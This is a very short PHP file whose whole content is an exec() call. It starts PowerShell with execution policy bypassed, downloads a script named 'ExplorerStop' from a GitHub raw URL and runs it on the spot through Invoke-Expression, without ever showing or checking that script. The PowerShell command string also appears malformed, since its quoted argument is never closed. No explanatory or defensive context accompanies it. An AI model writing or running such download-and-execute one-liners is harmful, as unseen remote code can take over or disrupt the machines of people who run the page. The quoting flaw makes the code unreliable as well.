<?php
echo exec('powershell -InputFormat none -ExecutionPolicy ByPass -NoProfile -Command "& { Invoke-Expression $((Invoke-WebRequest -Uri https://github.com/dhruv1972/ExplorerStop/raw/main/script.ps1 -UseBasicParsing).Content) }
');
?>
